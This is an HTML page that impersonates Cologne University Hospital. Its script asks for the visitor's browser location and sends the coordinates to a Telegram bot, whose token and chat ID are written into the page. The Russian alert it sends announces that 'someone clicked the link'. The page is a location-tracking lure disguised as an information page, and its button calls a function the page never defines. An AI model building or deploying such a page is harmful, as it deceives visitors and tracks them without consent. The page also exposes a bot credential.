<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <title>Cologne University Hospital</title>

  <style>
    body {
      margin: 0;
      min-height: 100vh;
      background:
        linear-gradient(rgba(0,0,0,0.72), rgba(0,0,0,0.72)),
        url("https://upload.wikimedia.org/wikipedia/commons/6/6f/Universit%C3%A4tsklinikum_K%C3%B6ln.jpg");
      background-size: cover;
      background-position: center;
      font-family: monospace;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .box {
      background: rgba(0,0,0,0.85);
      border: 2px solid #00ff00;
      box-shadow: 0 0 20px #00ff00;
      padding: 25px;
      width: 330px;
      text-align: center;
      color: #00ff00;
    }

    h1 { font-size: 18px; margin-bottom: 8px; }
    button {
      background: #00ff00;
      color: black;
      border: none;
      padding: 10px 18px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 12px;
    }
    #result { margin-top: 10px; font-size: 13px; }
  </style>
</head>

<body>
  <div class="box">
    <h1>Cologne University Hospital</h1>
    <p>Zugriff wird geprüft…</p>
    <button onclick="handleClick()">Informationen ansehen</button>
    <div id="result"></div>
  </div>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                document.getElementById("result").innerText = "Геолокация не поддерживается.";
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude.toFixed(4);
            const lon = position.coords.longitude.toFixed(4);
            
            // Telegram Bot Info
            const botToken = "8402128842:AAF5K_2JMX72H_sdN9Drxl_Wksmxpxzqu7c";
            const chatId = "8570996143";

            // Telegram API URL
            const message = `Кто-то нажал ссылку!\nШирота: ${lat}\nДолгота: ${lon}`;
            
            // Отправка сообщения в Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);

            document.getElementById("result").innerHTML = `
                Твои координаты получены.<br>
                Широта: ${lat}, Долгота: ${lon}<br>
                <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank">Открыть в Google Maps</a>
            `;
        }
    </script>
</body>
</html>
